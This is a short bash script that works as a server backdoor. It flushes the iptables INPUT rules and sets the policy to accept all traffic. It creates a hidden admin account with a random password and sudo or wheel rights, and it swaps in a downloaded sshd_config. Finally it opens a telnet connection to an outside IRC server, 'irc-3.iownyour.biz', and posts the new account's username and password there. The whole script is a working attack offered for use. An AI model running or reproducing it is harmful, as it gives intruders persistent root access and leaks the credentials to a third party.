#!/bin/bash
server="irc-3.iownyour.biz"
channel="help"
user="r00tz hostname servername :is.gd/sshpwn"
echo Intalling SSH...;
if [ -f /usr/bin/yum ]; then yum install telnet openssh* -y; fi;
if [ -f /usr/bin/apt ]; then apt install telnet ssh -y; fi;
echo 'Flushing iptables input'
rm -rf input
iptables -F INPUT;
iptables -P INPUT ACCEPT;
echo Adding new admin account...;
random_number=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1);
random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1);
useradd -m $random_user;
echo $random_user:$random_number | chpasswd;
if [ -f /usr/bin/yum ]; then usermod -aG wheel $random_user; fi;
if [ -f /usr/bin/apt ]; then usermod -g sudo $random_user; fi;
echo Configuring SSH...;
if [ ! -f ./sshd_banner ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_banner -o /etc/ssh/sshd_banner; else cp -r ./sshd_banner /etc/ssh/sshd_banner; fi;
if [ ! -f ./sshd_config ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config -o /etc/ssh/sshd_config; else cp -r ./sshd_config /etc/ssh/sshd_config; fi;
if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
arr4y="Added admin:, $random_user, password:, $random_number";
echo $arr4y;
echo "NICK r00t_$random_user" > input 
echo "USER $user" >> input
echo "JOIN #$channel" >> input
tail -f input | telnet $server 6667 &
sleep 5 && echo "PRIVMSG #$channel :$arr4y" >> input
